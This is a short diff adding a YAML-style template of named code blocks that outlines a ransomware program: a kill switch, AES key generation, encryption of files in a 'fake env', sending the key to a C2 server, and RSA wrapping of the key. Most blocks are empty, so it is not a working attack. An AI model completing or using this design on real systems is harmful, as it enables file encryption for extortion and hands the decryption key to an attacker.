@@ -1,0 +1,23 @@
+bloc_main: |
+  if killswitch():
+      sys.exit()
+  else:
+      encrypt_fake_env_files()
+bloc_killswitch:|
+  
+bloc_generate_aes_key: |
+
+bloc_list_files_in_fake_env: |
+
+bloc_encrypt_file: |
+
+bloc_encrypt_fake_env_files: |
+
+bloc_send_aes_key_to_c2: |
+
+bloc_load_rsa_public_key: |
+
+bloc_encrypt_aes_key_with_rsa: |
+  def encrypt_aes_key_with_rsa(aes_key, public_key):
+      cipher_rsa = PKCS1_OAEP.new(public_key)
+      return cipher_rsa.encrypt(aes_key)
